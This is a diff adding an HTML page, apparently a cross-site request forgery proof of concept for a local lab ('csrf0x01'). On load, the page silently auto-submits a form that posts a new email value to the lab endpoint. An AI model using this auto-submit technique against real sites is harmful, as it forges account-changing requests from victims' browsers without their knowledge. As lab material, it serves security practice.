@@ -1,0 +1,22 @@
+<html>
+
+<body>
+<form action="http://localhost/labs/csrf0x01.php" method="post">
+    <input type="text" name="email" value="test@example.com">
+    <button type="submit">Submit</button>
+</form>
+
+<script>
+window.onload = function () {
+    document.forms[0].submit();
+}
+
+</script>
+
+</body>
+</html>
+
+
+
+
+
